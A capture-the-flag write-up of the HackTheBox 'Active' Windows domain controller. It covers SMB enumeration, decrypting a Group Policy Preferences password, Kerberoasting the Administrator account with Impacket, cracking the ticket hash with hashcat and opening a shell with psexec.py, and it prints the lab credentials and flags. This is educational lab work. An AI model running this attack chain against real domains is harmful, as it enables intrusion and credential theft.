---
title: "HTB - Active"
date: 2024-11-17
draft: false
summary: "Writeup for Active, an easy difficulty Windows machine from HackTheBox."
category: "Machine"
tags: ["windows", "easy"]
---

#### Recon
###### Nmap
```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows]
└─$ sudo nmap -p- --min-rate 10000 10.10.10.100
[sudo] password for chronopad:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 16:38 WIB
Warning: 10.10.10.100 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.100
Host is up (0.18s latency).
Not shown: 60303 closed tcp ports (reset), 5210 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
49171/tcp open  unknown
49173/tcp open  unknown

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows]
└─$ sudo nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49165,49171,49173 -sCV 10.10.10.100 --stats-every=10s

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-17 09:41:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49173/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-11-17T09:42:07
|_  start_date: 2024-11-17T09:37:12
```

###### TCP port 139,445 - SMB
Enumerate SMB with `netexec`, successor to `crackmapexec`. Start with SMB NULL session.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows]
└─$ netexec smb 10.10.10.100 -u "" -p ""
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\:
```

Found domain name `active.htb`. List all of the shares by adding `--shares`, or just use `smbmap` to list available shares recursively.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows]
└─$ smbmap -H 10.10.10.100 -r --depth 10

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.10.10.100:445        Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        Replication                                             READ ONLY
        ./Replication
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    active.htb
        ./Replication//active.htb
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    DfsrPrivate
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    Policies
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    scripts
        ./Replication//active.htb/DfsrPrivate
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ConflictAndDeleted
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    Deleted
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    Installing
        ./Replication//active.htb/Policies
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    {31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    {6AC1786C-016F-11D2-945F-00C04fB984F9}
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        fr--r--r--               23 Sat Jul 21 17:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    Group Policy
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    USER
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        fr--r--r--              119 Sat Jul 21 17:38:11 2018    GPE.INI
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    Microsoft
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    Preferences
        fr--r--r--             2788 Sat Jul 21 17:38:11 2018    Registry.pol
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    Windows NT
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    SecEdit
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        fr--r--r--             1098 Sat Jul 21 17:38:11 2018    GptTmpl.inf
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    Groups
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        fr--r--r--              533 Sat Jul 21 17:38:11 2018    Groups.xml
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        fr--r--r--               22 Sat Jul 21 17:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    USER
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    Microsoft
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    Windows NT
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    SecEdit
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 17:37:44 2018    ..
        fr--r--r--             3722 Sat Jul 21 17:38:11 2018    GptTmpl.inf
        SYSVOL                                                  NO ACCESS       Logon server share
        Users                                                   NO ACCESS
[*] Closed 1 connections
```

Found interesting file *Groups.xml*. You can also download all of the files inside of the share.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows]
└─$ smbclient \\\\10.10.10.100\\Replication
Password for [WORKGROUP\chronopad]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (1.8 KiloBytes/sec) (average 0.7 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (0.5 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (1.4 KiloBytes/sec) (average 0.7 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (3.0 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \>
```

#### User Flag
###### Decrypting password
*Groups.xml*
```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

This file is apparently a Group Policy Preferences (GPP) XML file, containing a configuration data for the `active.htb\SVC_TGS` user. The password is decrypted, but can be easily reversible using `gpp-decrypt` tool.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows]
└─$ echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' > svc_tgs.pass

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows]
└─$ gpp-decrypt $(cat svc_tgs.pass )
GPPstillStandingStrong2k18
```

Obtained credentials: `SVC_TGS:GPPstillStandingStrong2k18`. Verify credentials with `netexec`.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows]
└─$ netexec smb 10.10.10.100 -u "SVC_TGS" -p "GPPstillStandingStrong2k18"
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

###### AD credentialed enumeration
List all user accounts and available shares with `netexec`.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows]
└─$ netexec smb 10.10.10.100 -u "SVC_TGS" -p "GPPstillStandingStrong2k18" --users
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
SMB         10.10.10.100    445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.10.100    445    DC               Administrator                 2018-07-18 19:06:40 0       Built-in account for administering the computer/domain
SMB         10.10.10.100    445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.10.100    445    DC               krbtgt                        2018-07-18 18:50:36 0       Key Distribution Center Service Account
SMB         10.10.10.100    445    DC               SVC_TGS                       2018-07-18 20:14:38 0
SMB         10.10.10.100    445    DC               [*] Enumerated 4 local users: ACTIVE

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows]
└─$ netexec smb 10.10.10.100 -u "SVC_TGS" -p "GPPstillStandingStrong2k18" --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.10.100    445    DC               Replication     READ
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share
SMB         10.10.10.100    445    DC               Users           READ
```

We now have read access to the `Users` share. We can navigate to `SVC_TGS`'s Desktop and get *user.txt* file.

#### Root Flag
###### Enumeration
Use the credentials to query and enumerate the LDAP with **ldapsearch**. Find non-disabled accounts / active accounts by setting the LDAP filter.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows/active.htb]
└─$ ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub '(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))' samaccountname | grep sAMAccountName
sAMAccountName: Administrator
sAMAccountName: SVC_TGS
```

We can also enumerate domain user accounts with Impacket's **GetADUsers.py**.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows/active.htb]
└─$ GetADUsers.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -all
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-19 02:06:40.351723  2024-11-17 16:38:26.644567
Guest                                                 <never>              <never>
krbtgt                                                2018-07-19 01:50:36.972031  <never>
SVC_TGS                                               2018-07-19 03:14:38.402764  2024-11-17 19:34:40.514739
```

Check for accounts with registered SPN, because those accounts are vulnerable to Kerberoasting. Use `GetUserSPNs.py` from Impacket.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows]
└─$ GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 02:06:40.351723  2024-11-17 16:38:26.644567
```

Found that the `Administrator` account is vulnerable to Kerberoasting. Why is it vulnerable? Because Kerberos uses SPN to identify account associated with a particular service instance, which means we can request a TGS for a service account and have the TGS encrypted with it's NTLM hash, which can be cracked locally.

###### Kerberoasting
Request a TGS and extract hash for `Administrator`.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows]
└─$ GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS -request-user Administrator
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 02:06:40.351723  2024-11-17 16:38:26.644567



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$08ba3370b7272dfc2f9e4e420ea2d0be$c93c7ccf8597854a16804184264c716d9ae63f31e96197858ced64b64976178a5b0ff509514dfc29c37ccfbbc14729e4d660f35574692c736710c0f265d4863ada71d5aaf82d23892e1a1e32332330b2ef1e6f7a2af7d3df3346bf91bb08050b293f874687f8aa91929e3d5dd62bdb0e5e5cf2d472fdd4489310699315f4e0cfe04f8ab109a7a06027b92233644850c3c1d824bf8862353e83f700c07a6db50c8596211df82cc893812752bab8467567c11acce8d75cf9a96fd6d45e4571a2c36a5eebb3d0f2a6af88be3e5d48e039d400f7c5535bc9750defeceda01ceb521028eb46ef31e6c2dc15511518eeec2b8b5825fb917b8ab1355f34958e45806a9c2404c2e48a1f030e5c6bd4e431f38b202b529ddc6344e22840323c30e05558d9b95d1f0bf2265b5ca0f9896372f5cb4e83dce31726317d46c4e3c00f48aefb7d8a5c400d35c232c97e43c58842f37ab1f08ccce57166b5d23c6ff13da1188e42ac44f32be7cb7c6f7cab7e66a5acde469ab7ed3d48247320212e1ce87ad77f0acc93426cf7ae5eb877af95d3739554f6d77f5d8c064810c3efb7d2bbb262caa889b70e7fd6d6c6013e18afdeac0ca804668cf68514f2b7f25ac808ad0400b641d3c30fc7627d61afb0731b508d8076b6e63a9a18ebb1815245359651922d7a849ba2ae76016775b4faf8fcc54c741544611c608f1ba6854fdd81793af7dec0052d3faca036edcd60f7b2ca2e69724958c21b53f17ba3a3e40f30af0a41ff47109e8681f8518f9d164aa35d6c36fde15dff9bf6ab111cee49af633baea5bfe61326303af591d5e9e5ea787bef5e120f87d49d56db0c09d5df2da35b83efade7276f6e0f397e9b047edbbda0cffe028a9096d5ec7a260564f746e0164c7989dae627177679c52aded1a5b95b85c22055ffd686ad64f292319a85fa33762145c6cd878787b2e66892fd91cf265e576fa8d231d5dd0b99acdf5b087f42aa370a0f64194f3564ba5071e47a6aa52b0b2315e0cd861156f0ca2e28ef528b22c0fca7de4467ac0868212302302e0dcf9c2d23a2384223811a19c3cf3d5fdfbdd105631068ac46fbd6446499b7d2719a5b8a4683fa3533b712151cfd3a366b88dedf50fd2dd26fad4cbbc77c84e6e6628f5d593af196d3927fb93b2ddec780ff37354d3387122c3bc5acdc47f7d204451f1de66194b1c71049c958e1558bbc60c748e48ad9f54583fc100a2f2d1529c0d014d56032c7a37a3e13313e5283
```

Obtained Administrator's hash. Crack the hash with `hashcat`.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows]
└─$ cat administrator.kerb | haiti -
Kerberos 5 TGS-REP etype 23 [HC: 13100] [JtR: krb5tgs]

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows]
└─$ hashcat -m 13100 administrator.kerb ~/Arsenal/wordlists/rockyou.txt
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$08ba3370b7272dfc2f9e4e420ea2d0be$c93c7ccf8597854a16804184264c716d9ae63f31e96197858ced64b64976178a5b0ff509514dfc29c37ccfbbc14729e4d660f35574692c736710c0f265d4863ada71d5aaf82d23892e1a1e32332330b2ef1e6f7a2af7d3df3346bf91bb08050b293f874687f8aa91929e3d5dd62bdb0e5e5cf2d472fdd4489310699315f4e0cfe04f8ab109a7a06027b92233644850c3c1d824bf8862353e83f700c07a6db50c8596211df82cc893812752bab8467567c11acce8d75cf9a96fd6d45e4571a2c36a5eebb3d0f2a6af88be3e5d48e039d400f7c5535bc9750defeceda01ceb521028eb46ef31e6c2dc15511518eeec2b8b5825fb917b8ab1355f34958e45806a9c2404c2e48a1f030e5c6bd4e431f38b202b529ddc6344e22840323c30e05558d9b95d1f0bf2265b5ca0f9896372f5cb4e83dce31726317d46c4e3c00f48aefb7d8a5c400d35c232c97e43c58842f37ab1f08ccce57166b5d23c6ff13da1188e42ac44f32be7cb7c6f7cab7e66a5acde469ab7ed3d48247320212e1ce87ad77f0acc93426cf7ae5eb877af95d3739554f6d77f5d8c064810c3efb7d2bbb262caa889b70e7fd6d6c6013e18afdeac0ca804668cf68514f2b7f25ac808ad0400b641d3c30fc7627d61afb0731b508d8076b6e63a9a18ebb1815245359651922d7a849ba2ae76016775b4faf8fcc54c741544611c608f1ba6854fdd81793af7dec0052d3faca036edcd60f7b2ca2e69724958c21b53f17ba3a3e40f30af0a41ff47109e8681f8518f9d164aa35d6c36fde15dff9bf6ab111cee49af633baea5bfe61326303af591d5e9e5ea787bef5e120f87d49d56db0c09d5df2da35b83efade7276f6e0f397e9b047edbbda0cffe028a9096d5ec7a260564f746e0164c7989dae627177679c52aded1a5b95b85c22055ffd686ad64f292319a85fa33762145c6cd878787b2e66892fd91cf265e576fa8d231d5dd0b99acdf5b087f42aa370a0f64194f3564ba5071e47a6aa52b0b2315e0cd861156f0ca2e28ef528b22c0fca7de4467ac0868212302302e0dcf9c2d23a2384223811a19c3cf3d5fdfbdd105631068ac46fbd6446499b7d2719a5b8a4683fa3533b712151cfd3a366b88dedf50fd2dd26fad4cbbc77c84e6e6628f5d593af196d3927fb93b2ddec780ff37354d3387122c3bc5acdc47f7d204451f1de66194b1c71049c958e1558bbc60c748e48ad9f54583fc100a2f2d1529c0d014d56032c7a37a3e13313e5283:Ticketmaster1968
```

Obtained `Administrator`'s password: `Administrator:Ticketmaster1968`

###### Retrieving root flag
```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows]
└─$ netexec smb 10.10.10.100 -u Administrator -p Ticketmaster1968
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows]
└─$ psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file UNfiOQwm.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service jfDE on 10.10.10.100.....
[*] Starting service jfDE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> cd c:\Users\Administrator\Desktop

c:\Users\Administrator\Desktop> type root.txt
1353440b190e78a45b39f4bdab2bb212
```

#### Result
###### Flags
- user: `34f1dfdc78315bb004ba1d6da7e9bc41`
- root: `1353440b190e78a45b39f4bdab2bb212`
